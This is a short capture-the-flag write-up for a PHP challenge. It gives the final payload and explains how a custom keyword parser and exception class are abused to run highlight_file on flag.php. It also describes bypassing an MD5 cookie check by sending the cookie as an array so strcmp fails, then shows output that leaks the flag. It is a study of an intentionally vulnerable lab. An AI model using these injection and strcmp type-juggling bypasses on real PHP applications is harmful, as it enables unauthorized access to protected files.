#Write Up for php.galf

Final Payload:

code:
```
ohce
ohce
ohce
ohce
ohce
```
args:
```
flag.php,69,0,highlight_file,orez_lum,orez_vid,syntaxreader
```
Cookie: DEBUG[]=a



From looking at the source code, we can see a strange method used to parse keywords. From this, we can provide the syntaxreader class as a "keyword" allowing us to access noitpexce with our own specified parameters.

The noitpexce.php exception class is particularly interesting because it allows us to specify an error function to use. From syntax reader we can begin to send in our own values as this function. One issue arises though, because when we pass in an array to noitpexce, it only takes the first 5 elements of our array. Thus, to specify that we want to run highlight file on flag.php, we can add a few ohce keywords to move the arg_val counter forward, to run our actual payload, and the first 5 arguments are the ones passed into noitpexce.

Note: a trivial way to bypass

```php
if (strcmp($_COOKIE['DEBUG'], hash("md5", $flag)) == 0)
```
is just to change the type of our cookie to be an array, so that strcmp throws an error, and the execution continues.

Running the payload gives us:
```php
Warning: Adming debugging enabled!php.galf 96 0 elif_thgilhgih <?php
if(!defined('block')) {
    die('Direct access not permitted');
}
$flag = "bctf{Nuf_S1_Zgn1ht_gn1k0vn1}";

?> Error Executing Code! Error: noitpecxe: 69 
```
